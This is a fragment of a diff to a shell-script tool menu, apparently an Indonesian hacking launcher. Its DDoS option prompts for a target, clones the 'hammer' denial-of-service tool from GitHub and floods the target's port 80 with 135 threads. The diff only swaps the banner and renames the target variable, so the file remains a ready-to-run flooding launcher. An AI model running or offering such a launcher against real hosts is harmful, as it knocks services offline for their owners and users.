@@ -76,11 +76,11 @@ fi
 if [ $bro = 2 ] || [ $bro = 2 ]
 then
 clear
-toilet -f slant --gay DDoS
-echo $ku SANGAT BERGUNA!
+echo $i
+figlet DDoS
+echo   
 sleep 0.1
-echo $i IP TARGET: #0813
-read IP #1802
+read -p "TARGET:~# " pukqimaq
 sleep 1
 clear
 git clone https://github.com/cyweb/hammer
@@ -89,5 +89,5 @@ clear
 cd hammer
 sleep 0.1
 clear
-python hammer.py -s $IP -p 80 -t 135
+python hammer.py -s $pukqimaq -p 80 -t 135
 fi
